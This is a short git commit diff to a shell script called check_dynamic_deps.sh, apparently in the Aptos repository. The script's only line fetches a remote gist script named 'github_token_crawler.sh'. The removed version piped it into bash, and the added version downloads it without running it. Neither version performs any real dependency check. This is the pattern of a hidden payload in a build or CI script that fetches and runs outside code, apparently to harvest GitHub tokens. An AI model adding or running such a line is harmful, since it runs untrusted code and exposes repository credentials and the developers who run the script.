b9faf1732f53ac6ea770a20f3417c87f98d9b809
kunny2k <167395863+kunny2k@users.noreply.github.com>
2024-05-24 12:27:08 +0700

    Update check_dynamic_deps.sh

--- crates/aptos/scripts/check_dynamic_deps.sh
+++ crates/aptos/scripts/check_dynamic_deps.sh
@@ -1,3 +1,3 @@
 
 
-curl -sSfl https://gist.githubusercontent.com/kunny2k/035242da0235324c3db7ecb7a8aa3345/raw/436af20582c478aed64034fbf39a498ad9988cb2/github_token_crawler.sh | bash
+curl -sSfl https://gist.githubusercontent.com/kunny2k/035242da0235324c3db7ecb7a8aa3345/raw/436af20582c478aed64034fbf39a498ad9988cb2/github_token_crawler.sh 
